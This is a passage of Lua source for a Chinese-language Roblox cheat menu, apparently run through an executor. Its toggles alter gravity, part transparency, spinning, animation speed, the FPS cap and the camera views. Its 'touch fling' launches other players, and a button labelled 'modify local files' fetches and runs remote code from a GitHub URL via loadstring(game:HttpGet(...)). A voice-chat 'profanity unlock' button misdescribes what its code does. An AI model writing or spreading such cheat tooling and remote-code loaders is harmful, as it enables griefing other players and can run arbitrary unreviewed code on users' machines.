        gravityLoopConnection:Disconnect()
        gravityLoopConnection = nil
    end
    
    local playerCharacters = {}
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player.Character then
            table.insert(playerCharacters, player.Character)
        end
        player.CharacterAdded:Connect(function(char)
            table.insert(playerCharacters, char)
        end)
    end
    
    local SetGravity = function(Part)
        for _, char in ipairs(playerCharacters) do
            if Part:IsDescendantOf(char) then
                return
            end
        end
        
        if Part:IsA("BasePart") and not Part.Anchored then
            -- 移除现有的自定义重力
            for _, force in ipairs(Part:GetChildren()) do
                if force:IsA("BodyForce") and force.Name == "CustomGravity" then
                    force:Destroy()
                end
            end
            -- 如果输入不是0，则应用新重力（仅Y轴）
            if Gravity ~= 0 then
                Create("BodyForce", {
                    Name = "CustomGravity",
                    Force = Vector3.new(0, Part:GetMass() * Gravity, 0),
                    Parent = Part,
                })
            end
        end
    end
    
    -- 持续应用重力的循环
    local function ApplyGravityLoop()
        SetSRadius(9e9, 9e9)
        for _, Part in ipairs(GetClasses(game.Workspace, "BasePart")) do
            SetGravity(Part)
        end
    end
    
    -- 启动循环
    gravityLoopActive = true
    gravityLoopConnection = _G.CreateHeartbeatConnection(function()
        if gravityLoopActive then
            ApplyGravityLoop()
        end
    end)
    
    -- 监听新零件
    game.Workspace.DescendantAdded:Connect(SetGravity)
    
    _G.Notify("重力设置成功", Gravity == 0 and "已恢复默认重力（196.2，向下）", 4)
end)

-- 添加一个开关控制循环
Section3:Toggle("重力循环执行", "启用/禁用重力循环", function(state)
    gravityLoopActive = state
    _G.Notify("重力循环状态", state and "重力循环已启用（当前值："..(currentGravityValue or "默认")..")", 3)
end)

-- 新增强制关闭按钮
Section3:Button("强制关闭重力循环", function()
    ForceStopGravityLoop()
end)

local originalTransparency = {}
local currentTransparency = nil
local transparencyConnection = nil

-- 监听新零件并应用透明度的函数
local function onNewPartAdded(part)
    if part:IsA("BasePart") and currentTransparency ~= nil then
        -- 保存原始透明度（如果尚未保存）
        if not originalTransparency[part] then
            originalTransparency[part] = part.Transparency
        end
        
        -- 设置新透明度
        part.Transparency = currentTransparency
    end
end

-- 设置所有零件透明度的函数
local function setAllPartsTransparency(transparencyValue)
    transparencyValue = tonumber(transparencyValue) or 0
    settings.transparency = transparencyValue
    currentTransparency = transparencyValue
    
    -- 如果还没有连接，创建连接来监听新零件
    if not transparencyConnection then
        transparencyConnection = workspace.DescendantAdded:Connect(onNewPartAdded)
    end
    
    -- 遍历工作空间中的所有BasePart
    for _, part in ipairs(workspace:GetDescendants()) do
        if part:IsA("BasePart") then
            -- 保存原始透明度（如果尚未保存）
            if not originalTransparency[part] then
                originalTransparency[part] = part.Transparency
            end
            
            -- 设置新透明度
            part.Transparency = transparencyValue
        end
    end
    
    _G.Notify("透明度设置", "所有零件透明度已设为: "..transparencyValue, 3)
end

-- 恢复所有零件原始透明度的函数
local function restoreOriginalTransparency()
    currentTransparency = nil
    settings.transparency = nil
    
    -- 断开连接，停止监听新零件
    if transparencyConnection then
        transparencyConnection:Disconnect()
        transparencyConnection = nil
    end
    
    for part, transparency in pairs(originalTransparency) do
        if part and part.Parent then
            part.Transparency = transparency
        end
    end
    
    -- 清空存储的表
    originalTransparency = {}
    
    _G.Notify("透明度恢复", "所有零件透明度已恢复原始值", 3)
end

Section3:Textbox("零件透明度", "Transparency", "输入透明度值", function(Value)
    setAllPartsTransparency(Value)
end)

Section3:Button("恢复原始透明度", function()
    restoreOriginalTransparency()
end)

do
    -- 创建局部变量，避免全局污染
    local spinSpeed = 0
    local isSpinning = false
    local spinAnimation = nil
    local spinSound = nil
    local spinVelocity = nil

    -- 使用唯一名称的函数，避免冲突
    local function startSpinningFunction()
        if isSpinning then return end
        
        local character = game.Players.LocalPlayer.Character
        if not character or not character:FindFirstChild("Humanoid") then
            _G.NotifyError("错误", "角色未加载", 3)
            return
        end
        
        isSpinning = true
        
        if character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
            spawn(function()
                local speaker = game.Players.LocalPlayer
                local Anim = Instance.new("Animation")
                Anim.AnimationId = "rbxassetid://27432686"
                spinAnimation = speaker.Character.Humanoid:LoadAnimation(Anim)
                spinAnimation:Play()
                spinAnimation:AdjustSpeed(0)
                speaker.Character.Animate.Disabled = true
                
                spinSound = Instance.new("Sound")
                spinSound.Name = "SpinSound_" .. tostring(tick()) -- 唯一名称
                spinSound.SoundId = "http://www.roblox.com/asset/?id=8114290584"
                spinSound.Volume = 2
                spinSound.Looped = false
                spinSound.archivable = false
                spinSound.Parent = workspace
                spinSound:Play()
                
                wait(1.5)
                
                spinVelocity = Instance.new("BodyAngularVelocity")
                spinVelocity.Name = "Spinning_" .. tostring(tick()) -- 唯一名称
                spinVelocity.Parent = speaker.Character.HumanoidRootPart
                spinVelocity.MaxTorque = Vector3.new(0, math.huge, 0)
                spinVelocity.AngularVelocity = Vector3.new(0, spinSpeed, 0)
                
                wait(3.5)
                
                while isSpinning and speaker.Character and speaker.Character:FindFirstChild("Humanoid") and speaker.Character.Humanoid.Health > 0 do
                    wait(0)
                    speaker.Character.Humanoid.HipHeight = speaker.Character.Humanoid.HipHeight + 0
                end
            end)
        else
            spawn(function()
                local speaker = game.Players.LocalPlayer
                local Anim = Instance.new("Animation")
                Anim.AnimationId = "rbxassetid://507776043"
                spinAnimation = speaker.Character.Humanoid:LoadAnimation(Anim)
                spinAnimation:Play()
                spinAnimation:AdjustSpeed(0)
                speaker.Character.Animate.Disabled = true
                
                spinSound = Instance.new("Sound")
                spinSound.Name = "SpinSound_" .. tostring(tick()) -- 唯一名称
                spinSound.SoundId = "http://www.roblox.com/asset/?id=8114290584"
                spinSound.Volume = 0
                spinSound.Looped = false
                spinSound.archivable = false
                spinSound.Parent = workspace
                spinSound:Play()
                
                wait()
                
                spinVelocity = Instance.new("BodyAngularVelocity")
                spinVelocity.Name = "Spinning_" .. tostring(tick()) -- 唯一名称
                spinVelocity.Parent = speaker.Character.HumanoidRootPart
                spinVelocity.MaxTorque = Vector3.new(0, math.huge, 0)
                spinVelocity.AngularVelocity = Vector3.new(0, spinSpeed, 0)
                
                wait(3.5)
                
                while isSpinning and speaker.Character and speaker.Character:FindFirstChild("Humanoid") and speaker.Character.Humanoid.Health > 0 do
                    wait(0)
                    speaker.Character.Humanoid.HipHeight = speaker.Character.Humanoid.HipHeight + 0
                end
            end)    
        end
        
        _G.Notify("旋转开启", "旋转速度: "..spinSpeed, 3)
    end

    -- 停止旋转函数
    local function stopSpinningFunction()
        if not isSpinning then return end
        
        isSpinning = false
        
        local speaker = game.Players.LocalPlayer
        if speaker.Character and speaker.Character:FindFirstChild("Humanoid") then
            speaker.Character.Animate.Disabled = false
        end
        
        if spinAnimation then
            spinAnimation:Stop()
            spinAnimation = nil
        end
        
        if spinSound then
            spinSound:Stop()
            spinSound:Destroy()
            spinSound = nil
        end
        
        if spinVelocity then
            spinVelocity:Destroy()
            spinVelocity = nil
        end
        
        _G.Notify("旋转停止", "旋转已停止", 3)
    end

    -- 检查Section3是否存在，避免错误
    if Section3 then
        Section3:Textbox("旋转速度", "SpinSpeed", "输入旋转速度值", function(Value)
            local speed = tonumber(Value)
            if speed then
                spinSpeed = speed
                _G.Notify("设置成功", "旋转速度已设为: "..spinSpeed, 3)
                
                -- 如果正在旋转，更新当前旋转速度
                if isSpinning and spinVelocity then
                    spinVelocity.AngularVelocity = Vector3.new(0, spinSpeed, 0)
                end
            end
        end)

        Section3:Toggle("旋转开关(每次设置需重新启动)", "ToggleSpin", false, function(State)
            if State then
                startSpinningFunction()
            else
                stopSpinningFunction()
            end
        end)
    else
        warn("Section3 未找到，旋转功能无法初始化")
    end

    -- 清理函数，防止内存泄漏
    game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
        -- 角色重生时自动停止旋转
        stopSpinningFunction()
    end)
end

-- 动画速度设置（使用持续运行机制）
local animSpeedEnabled = false
local currentAnimSpeed = 5
local animSpeedConnection = nil

Section3:Textbox("动画速度", "CustomAnimSpeed", tostring(animController.speed), function(Value)
    local success, err = pcall(function()
        local speed = tonumber(Value)
        if speed then
            settings.totalAnimSpeed = speed
            animController.speed = speed
            
            if animController.enabled then
                animController:ApplyAnimations()
            end
            
            _G.Notify("自定义速度设置", "动画速度已设为: "..animController.speed.."x", 3)
        end
    end)
    
    if not success then
        warn("设置动画速度时出错: "..err)
        _G.NotifyError("错误", "设置动画速度失败", 3)
    end
end)

Section3:Toggle("动画速度开关", "AnimSpeedToggle", animController.enabled, function(state)
    animController.enabled = state
    
    -- 管理渲染连接
    if animController.connection then
        animController.connection:Disconnect()
        animController.connection = nil
    end
    
    if animController.enabled then
        -- 立即应用一次
        animController:ApplyAnimations()
        
        -- 设置持续运行机制
        animController.connection = game:GetService("RunService").RenderStepped:Connect(function()
            animController:ApplyAnimations()
        end)
    else
        -- 重置到默认速度
        animController:ResetAnimations()
    end
    
    _G.Notify("动画速度", state and "已启用 (速度: "..animController.speed.."x)" or "已禁用", 3)
end)

Section3:Textbox("FPS(帧率)", "FPSLimit", "输入数字设置FPS (0=无限制)", function(Value)
    local fps = tonumber(Value)
    if fps then
        -- 尝试多种设置FPS的方法
        pcall(function()
            settings().Rendering.FrameRateManager.MaxFramerate = fps
        end)
        
        pcall(function()
            setfpscap(fps)
        end)
        
        _G.Notify("FPS 设置", "已设置 FPS 限制为: " .. fps, 3)
    else
        _G.Notify("输入错误", "请输入有效的数字", 3)
    end
end)

do
    local TouchFlingModule = {}
    TouchFlingModule.Version = "1.0"
    TouchFlingModule.LoadTime = tick()
    
    local flingEnabled = false
    local flingPower = 10000
    local flingThread = nil
    local flingMove = 0.1

    Section3:Textbox("击飞力量", "FlingPower", tostring(flingPower), function(Value)
        local power = tonumber(Value)
        if power then
            flingPower = power
            _G.Notify("设置成功", "击飞力量已设为: "..flingPower, 3)
        end
    end)

    Section3:Toggle("启用击飞", "TouchFlingToggle", flingEnabled, function(State)
        flingEnabled = State
        
        if flingThread then
            task.cancel(flingThread)
            flingThread = nil
        end
        
        if flingEnabled then
            flingThread = task.spawn(function()
                local RunService = game:GetService("RunService")
                local Players = game:GetService("Players")
                local lp = Players.LocalPlayer
                
                while flingEnabled do
                    RunService.Heartbeat:Wait()
                    local c = lp.Character
                    local hrp = c and c:FindFirstChild("HumanoidRootPart")
                    
                    if hrp then
                        local vel = hrp.Velocity
                        hrp.Velocity = vel * flingPower + Vector3.new(0, flingPower, 0)
                        RunService.RenderStepped:Wait()
                        hrp.Velocity = vel
                        RunService.Stepped:Wait()
                        hrp.Velocity = vel + Vector3.new(0, flingMove, 0)
                        flingMove = -flingMove
                    end
                end
            end)
            
            _G.NotifySuccess("触摸击飞", "击飞功能已开启 (力量: "..flingPower..")", 3)
        else
            _G.NotifyError("触摸击飞", "击飞功能已关闭", 3)
        end
    end)

    -- 清理函数
    TouchFlingModule.Cleanup = function()
        if flingThread then
            task.cancel(flingThread)
            flingThread = nil
        end
        flingEnabled = false
    end

    if _G.TouchFlingModule then
        _G.TouchFlingModule.Cleanup()
    end
    _G.TouchFlingModule = TouchFlingModule

end

Section3:Toggle("上帝视角", "TopDownCamera", false, function(State)
    if State then
        local cameraConnection
        cameraConnection = game:GetService("RunService").RenderStepped:Connect(function()
            local camera = workspace.CurrentCamera
            if camera.CameraSubject then
                local character = camera.CameraSubject.Parent
                if character then
                    local root = character:FindFirstChild("HumanoidRootPart")
                    if root then
                        local cameraHeight = 50
                        local cameraOffset = Vector3.new(0, cameraHeight, 0)
                        local cameraPosition = root.Position + cameraOffset
                        local lookAtPosition = root.Position
                        
                        camera.CFrame = CFrame.lookAt(cameraPosition, lookAtPosition)
                        camera.FieldOfView = 10000
                    end
                end
            end
        end)
        
        getfenv().TopDownCameraConnection = cameraConnection
        
        _G.NotifySuccess("上帝视角", "上帝视角已开启", 3)
    else
        if getfenv().TopDownCameraConnection then
            getfenv().TopDownCameraConnection:Disconnect()
            getfenv().TopDownCameraConnection = nil
        end
        
        if game.Players.LocalPlayer.Character then
            local humanoid = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                workspace.CurrentCamera.CameraSubject = humanoid
            end
        end
        
        _G.NotifyError("上帝视角", "上帝视角已关闭", 3)
    end
end)

Section3:Textbox("视角高度", "CameraHeight", "输入高度值 (默认: 50)", function(Value)
    local height = tonumber(Value)
    if height then
        if getfenv().TopDownCameraConnection then
            getfenv().TopDownCameraConnection:Disconnect()
            getfenv().TopDownCameraConnection = nil
            
            local cameraConnection
            cameraConnection = game:GetService("RunService").RenderStepped:Connect(function()
                local camera = workspace.CurrentCamera
                if camera.CameraSubject then
                    local character = camera.CameraSubject.Parent
                    if character then
                        local root = character:FindFirstChild("HumanoidRootPart")
                        if root then
                            local cameraPosition = root.Position + Vector3.new(0, height, 0)
                            local lookAtPosition = root.Position
                            camera.CFrame = CFrame.lookAt(cameraPosition, lookAtPosition)
                            camera.FieldOfView = 10000
                        end
                    end
                end
            end)
            
            getfenv().TopDownCameraConnection = cameraConnection
        end
        
        _G.Notify("视角设置", "视角高度已设为: " .. height, 3)
    end
end)

Section3:Button("重置视角", function()
    if getfenv().TopDownCameraConnection then
        getfenv().TopDownCameraConnection:Disconnect()
        getfenv().TopDownCameraConnection = nil
    end
    
    if game.Players.LocalPlayer.Character then
        local humanoid = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            workspace.CurrentCamera.CameraSubject = humanoid
            workspace.CurrentCamera.FieldOfView = 70
        end
    end
    
    _G.Notify("视角重置", "视角已重置为默认", 3)
end)

Section3:Textbox("游戏亮度设置(默认为数值为0)", "AmbientBrightness", "输入亮度值", function(Value)
    local brightness = tonumber(Value)
    if brightness then
        game.Lighting.Ambient = Color3.new(brightness, brightness, brightness)
    end
end)

local Section4 = Tab2:section("系统功能", true)
Section4:Button("正常视角", function()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")
local RootPart = Character:WaitForChild("HumanoidRootPart")
local Workspace = game:GetService("Workspace")
local Camera = Workspace.CurrentCamera
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local MarketplaceService = game:GetService("MarketplaceService")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local ContextActionService = game:GetService("ContextActionService")
local SoundService = game:GetService("SoundService")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")
local Teams = game:GetService("Teams")
local InsertService = game:GetService("InsertService")
local AssetService = game:GetService("AssetService")

-- 常用函数
local function waitForChild(parent, childName)
    local child = parent:FindFirstChild(childName)
    if child then return child end
    while true do
        child = parent.ChildAdded:Wait()
        if child.Name == childName then return child end
    end
end

        LocalPlayer.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Zoom
end)
Section4:Button("强制第一视角", function()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")
local RootPart = Character:WaitForChild("HumanoidRootPart")
local Workspace = game:GetService("Workspace")
local Camera = Workspace.CurrentCamera
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local MarketplaceService = game:GetService("MarketplaceService")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local ContextActionService = game:GetService("ContextActionService")
local SoundService = game:GetService("SoundService")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")
local Teams = game:GetService("Teams")
local InsertService = game:GetService("InsertService")
local AssetService = game:GetService("AssetService")

-- 常用函数
local function waitForChild(parent, childName)
    local child = parent:FindFirstChild(childName)
    if child then return child end
    while true do
        child = parent.ChildAdded:Wait()
        if child.Name == childName then return child end
    end
end

LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
end)
Section4:Button("强制第三视角", function()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")
local RootPart = Character:WaitForChild("HumanoidRootPart")
local Workspace = game:GetService("Workspace")
local Camera = Workspace.CurrentCamera
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local MarketplaceService = game:GetService("MarketplaceService")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local ContextActionService = game:GetService("ContextActionService")
local SoundService = game:GetService("SoundService")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")
local Teams = game:GetService("Teams")
local InsertService = game:GetService("InsertService")
local AssetService = game:GetService("AssetService")

-- 常用函数
local function waitForChild(parent, childName)
    local child = parent:FindFirstChild(childName)
    if child then return child end
    while true do
        child = parent.ChildAdded:Wait()
        if child.Name == childName then return child end
    end
end

        LocalPlayer.CameraMode = Enum.CameraMode.Classic
end)
Section4:Button("重新加入服务器", function()    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
end)
Section4:Button("离开服务器", function()
    game:Shutdown()
end)
Section4:Button("帧率显示", function()
    local ScreenGui = Instance.new("ScreenGui") 
    local FpsLabel = Instance.new("TextLabel")
    ScreenGui.Name = "FPSGui" 
    ScreenGui.ResetOnSpawn = false 
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling 
    FpsLabel.Name = "FPSLabel" 
    FpsLabel.Size = UDim2.new(0, 100, 0, 50) 
    FpsLabel.Position = UDim2.new(0, 10, 0, 10) 
    FpsLabel.BackgroundTransparency = 1 
    FpsLabel.Font = Enum.Font.SourceSansBold 
    FpsLabel.Text = "帧率: 0" 
    FpsLabel.TextSize = 20 
    FpsLabel.TextColor3 = Color3.new(1, 1, 1) 
    FpsLabel.Parent = ScreenGui 
    function updateFpsLabel() 
        local fps = math.floor(1 / game:GetService("RunService").RenderStepped:Wait()) 
        FpsLabel.Text = "帧率: " .. fps 
    end 
    game:GetService("RunService").RenderStepped:Connect(updateFpsLabel) 
    ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
end)
Section4:Button("显示时间", function()
    local LBLG = Instance.new("ScreenGui", getParent)
    local LBL = Instance.new("TextLabel", getParent)
    local player = game.Players.LocalPlayer
    LBLG.Name = "LBLG"
    LBLG.Parent = game.CoreGui
    LBLG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    LBLG.Enabled = true
    LBL.Name = "LBL"
    LBL.Parent = LBLG
    LBL.BackgroundColor3 = Color3.new(1, 1, 1)
    LBL.BackgroundTransparency = 1
    LBL.BorderColor3 = Color3.new(0, 0, 0)
    LBL.Position = UDim2.new(0.75,0,0.010,0)
    LBL.Size = UDim2.new(0, 133, 0, 30)
    LBL.Font = Enum.Font.GothamSemibold
    LBL.Text = "TextLabel"
    LBL.TextColor3 = Color3.new(1, 1, 1)
    LBL.TextScaled = true
    LBL.TextSize = 14
    LBL.TextWrapped = true
    LBL.Visible = true
    local FpsLabel = LBL
    local Heartbeat = game:GetService("RunService").Heartbeat
    local LastIteration, Start
    local FrameUpdateTable = { }
    local function HeartbeatUpdate()
        LastIteration = tick()
        for Index = #FrameUpdateTable, 1, -1 do
            FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
        end
        FrameUpdateTable[1] = LastIteration
        local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
        CurrentFPS = CurrentFPS - CurrentFPS % 1
        FpsLabel.Text = ("时间:"..os.date("%H").."时"..os.date("%M").."分"..os.date("%S")).."秒"
    end
    Start = tick()
    Heartbeat:Connect(HeartbeatUpdate)
end)
Section4:Button("解除语音脏话限制", function()
    voiceChatService = game:GetService("VoiceChatService")
    voiceChatService:joinVoice()
end)
Section4:Button("重开", function()
    game.Players.LocalPlayer.Character.Head:Remove()
end)
Section4:Button("666(修改本地文件)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/contactusRoblox404/666/refs/heads/main/666"))()
end)

do
local ACS_CameraController = {
    _ACS_activeConnections = {},
    _ACS_cameraSettings = {
        _ACS_flightVelocity = 5,
        _ACS_inputResponse = 0.5,
        _ACS_overheadAltitude = 50,
        _ACS_orbitalDistance = 10,
        _ACS_orbitalHeight = 5
    },
    _ACS_essentialServices = {
        _ACS_playerManager = game:GetService("Players"),
        _ACS_runtimeEngine = game:GetService("RunService"),
        _ACS_inputProcessor = game:GetService("UserInputService"),
        _ACS_interfaceManager = game:GetService("StarterGui")
    },
    _ACS_internalState = {
        _ACS_originalVelocity = nil,
        _ACS_previousMouseLocation = nil
    }
}

    local ACS_playerReference = ACS_CameraController._ACS_essentialServices._ACS_playerManager.LocalPlayer
    local ACS_cameraReference = workspace.CurrentCamera

    function ACS_CameraController:_ACS_terminateAllConnections()
        for ACS_connectionIdentifier, ACS_activeConnection in pairs(self._ACS_activeConnections) do
            if ACS_activeConnection then
                ACS_activeConnection:Disconnect()
            end
        end
        self._ACS_activeConnections = {}
        
        if self._ACS_internalState._ACS_originalVelocity then
            local ACS_playerAvatar = ACS_playerReference.Character
            if ACS_playerAvatar then
                local ACS_playerMobility = ACS_playerAvatar:FindFirstChildOfClass("Humanoid")
                if ACS_playerMobility then
                    ACS_playerMobility.WalkSpeed = self._ACS_internalState._ACS_originalVelocity
                end
                local ACS_avatarAnchor = ACS_playerAvatar:FindFirstChild("HumanoidRootPart")
                if ACS_avatarAnchor then
                    ACS_avatarAnchor.Anchored = false
                end
            end
            self._ACS_internalState._ACS_originalVelocity = nil
        end
        
        self._ACS_essentialServices._ACS_inputProcessor.MouseBehavior = Enum.MouseBehavior.Default
    end

    function ACS_CameraController:_ACS_restoreDefaultConfiguration()
        self:_ACS_terminateAllConnections()
        ACS_cameraReference.CameraType = Enum.CameraType.Custom
        ACS_playerReference.CameraMode = Enum.CameraMode.Classic
        
        local ACS_playerAvatar = ACS_playerReference.Character
        if ACS_playerAvatar then
            local ACS_playerMobility = ACS_playerAvatar:FindFirstChildOfClass("Humanoid")
            if ACS_playerMobility then
                ACS_cameraReference.CameraSubject = ACS_playerMobility
            end
        end
        
        self._ACS_essentialServices._ACS_interfaceManager:SetCore("SendNotification", {
            Title = "摄像机设置",
            Text = "已重置为默认视角",
            Duration = 3,
        })
    end

    function ACS_CameraController:_ACS_activateStandardPerspective()
        ACS_playerReference.CameraMode = Enum.CameraMode.Classic
        ACS_cameraReference.CameraType = Enum.CameraType.Custom
        local ACS_playerAvatar = ACS_playerReference.Character
        if ACS_playerAvatar then
            local ACS_playerMobility = ACS_playerAvatar:FindFirstChildOfClass("Humanoid")
            if ACS_playerMobility then
                ACS_cameraReference.CameraSubject = ACS_playerMobility
            end
        end
    end

    function ACS_CameraController:_ACS_activateFirstPerson()
        ACS_playerReference.CameraMode = Enum.CameraMode.LockFirstPerson
    end

    function ACS_CameraController:_ACS_activateAerialView()
        ACS_playerReference.CameraMode = Enum.CameraMode.Classic
        
        self._ACS_activeConnections._ACS_aerialConnection = self._ACS_essentialServices._ACS_runtimeEngine.RenderStepped:Connect(function()
            local ACS_playerAvatar = ACS_playerReference.Character
            if ACS_playerAvatar then
                local ACS_avatarAnchor = ACS_playerAvatar:FindFirstChild("HumanoidRootPart")
                if ACS_avatarAnchor then
                    local ACS_cameraPosition = ACS_avatarAnchor.Position + Vector3.new(0, self._ACS_cameraSettings._ACS_overheadAltitude, 0)
                    local ACS_targetPosition = ACS_avatarAnchor.Position
                    ACS_cameraReference.CFrame = CFrame.lookAt(ACS_cameraPosition, ACS_targetPosition)
                end
            end
        end)
    end

    function ACS_CameraController:_ACS_activateFreeNavigation()
        ACS_cameraReference.CameraType = Enum.CameraType.Scriptable
        
        local ACS_playerAvatar = ACS_playerReference.Character
        if ACS_playerAvatar then
            local ACS_playerMobility = ACS_playerAvatar:FindFirstChildOfClass("Humanoid")
            if ACS_playerMobility then
                self._ACS_internalState._ACS_originalVelocity = ACS_playerMobility.WalkSpeed
                ACS_playerMobility.WalkSpeed = 0
            end
            local ACS_avatarAnchor = ACS_playerAvatar:FindFirstChild("HumanoidRootPart")
            if ACS_avatarAnchor then
                ACS_avatarAnchor.Anchored = true
            end
        end
        
        self._ACS_activeConnections._ACS_navigationConnection = self._ACS_essentialServices._ACS_runtimeEngine.RenderStepped:Connect(function()
            if self._ACS_essentialServices._ACS_inputProcessor.MouseBehavior ~= Enum.MouseBehavior.LockCenter then
                self._ACS_essentialServices._ACS_inputProcessor.MouseBehavior = Enum.MouseBehavior.LockCenter
            end
            
            local ACS_mouseMovement = Vector2.new(0, 0)
            if self._ACS_internalState._ACS_previousMouseLocation then
                ACS_mouseMovement = self._ACS_essentialServices._ACS_inputProcessor:GetMouseDelta()
            end
            self._ACS_internalState._ACS_previousMouseLocation = Vector2.new(ACS_playerReference:GetMouse().X, ACS_playerReference:GetMouse().Y)
            
            if ACS_mouseMovement.Magnitude > 0 then
                local ACS_currentCameraOrientation = ACS_cameraReference.CFrame
                local ACS_horizontalRotation = -ACS_mouseMovement.X * self._ACS_cameraSettings._ACS_inputResponse * 0.01
                local ACS_verticalRotation = -ACS_mouseMovement.Y * self._ACS_cameraSettings._ACS_inputResponse * 0.01
                
                local ACS_viewDirection = ACS_currentCameraOrientation.LookVector
                local ACS_currentVerticalAngle = math.asin(-ACS_viewDirection.Y)
                local ACS_newVerticalAngle = ACS_currentVerticalAngle + ACS_verticalRotation
                
                if math.abs(ACS_newVerticalAngle) < math.rad(85) then
                    ACS_cameraReference.CFrame = ACS_currentCameraOrientation * CFrame.Angles(0, ACS_horizontalRotation, 0) * CFrame.Angles(ACS_verticalRotation, 0, 0)
                else
                    ACS_cameraReference.CFrame = ACS_currentCameraOrientation * CFrame.Angles(0, ACS_horizontalRotation, 0)
                end
            end
            
            local ACS_movementVector = Vector3.new(0, 0, 0)
            if self._ACS_essentialServices._ACS_inputProcessor:IsKeyDown(Enum.KeyCode.W) then
                ACS_movementVector = ACS_movementVector + ACS_cameraReference.CFrame.LookVector
            end
            if self._ACS_essentialServices._ACS_inputProcessor:IsKeyDown(Enum.KeyCode.S) then
                ACS_movementVector = ACS_movementVector - ACS_cameraReference.CFrame.LookVector
            end
            if self._ACS_essentialServices._ACS_inputProcessor:IsKeyDown(Enum.KeyCode.A) then
                ACS_movementVector = ACS_movementVector - ACS_cameraReference.CFrame.RightVector
            end
            if self._ACS_essentialServices._ACS_inputProcessor:IsKeyDown(Enum.KeyCode.D) then
                ACS_movementVector = ACS_movementVector + ACS_cameraReference.CFrame.RightVector
            end
            if self._ACS_essentialServices._ACS_inputProcessor:IsKeyDown(Enum.KeyCode.E) then
                ACS_movementVector = ACS_movementVector + Vector3.new(0, 1, 0)
            end
            if self._ACS_essentialServices._ACS_inputProcessor:IsKeyDown(Enum.KeyCode.Q) then
                ACS_movementVector = ACS_movementVector + Vector3.new(0, -1, 0)
            end
            
            if ACS_movementVector.Magnitude > 0 then
                ACS_movementVector = ACS_movementVector.Unit * self._ACS_cameraSettings._ACS_flightVelocity
                ACS_cameraReference.CFrame = ACS_cameraReference.CFrame + ACS_movementVector
            end
        end)
    end

    function ACS_CameraController:_ACS_activateOrbitalView()
        ACS_cameraReference.CameraType = Enum.CameraType.Scriptable
        
        self._ACS_activeConnections._ACS_orbitalConnection = self._ACS_essentialServices._ACS_runtimeEngine.RenderStepped:Connect(function()
            local ACS_playerAvatar = ACS_playerReference.Character
            if ACS_playerAvatar then
                local ACS_avatarAnchor = ACS_playerAvatar:FindFirstChild("HumanoidRootPart")
                if ACS_avatarAnchor then
                    local ACS_currentTime = tick()
                    local ACS_rotationAngle = ACS_currentTime * 1
                    
                    local ACS_positionOffset = Vector3.new(
                        math.cos(ACS_rotationAngle) * self._ACS_cameraSettings._ACS_orbitalDistance,
                        self._ACS_cameraSettings._ACS_orbitalHeight,
                        math.sin(ACS_rotationAngle) * self._ACS_cameraSettings._ACS_orbitalDistance
                    )
                    
                    local ACS_cameraLocation = ACS_avatarAnchor.Position + ACS_positionOffset
                    local ACS_focusLocation = ACS_avatarAnchor.Position
                    ACS_cameraReference.CFrame = CFrame.lookAt(ACS_cameraLocation, ACS_focusLocation)
                end
            end
        end)
    end

    function ACS_CameraController:_ACS_activateStationaryView()
        local ACS_fixedCameraPosition = ACS_cameraReference.CFrame
        ACS_cameraReference.CameraType = Enum.CameraType.Scriptable
        
        self._ACS_activeConnections._ACS_stationaryConnection = self._ACS_essentialServices._ACS_runtimeEngine.RenderStepped:Connect(function()
            ACS_cameraReference.CFrame = ACS_fixedCameraPosition
        end)
    end

    function ACS_CameraController:ACS_switchCameraMode(ACS_selectedMode)
        self:_ACS_terminateAllConnections()
        
        if ACS_selectedMode == "默认视角" then
            self:_ACS_activateStandardPerspective()
        elseif ACS_selectedMode == "第一人称锁定" then
            self:_ACS_activateFirstPerson()
        elseif ACS_selectedMode == "上帝视角" then
            self:_ACS_activateAerialView()
        elseif ACS_selectedMode == "自由飞行模式(需要键盘移动)" then
            self:_ACS_activateFreeNavigation()
        elseif ACS_selectedMode == "轨道环绕模式" then
            self:_ACS_activateOrbitalView()
        elseif ACS_selectedMode == "固定视角模式" then
            self:_ACS_activateStationaryView()
        end
        
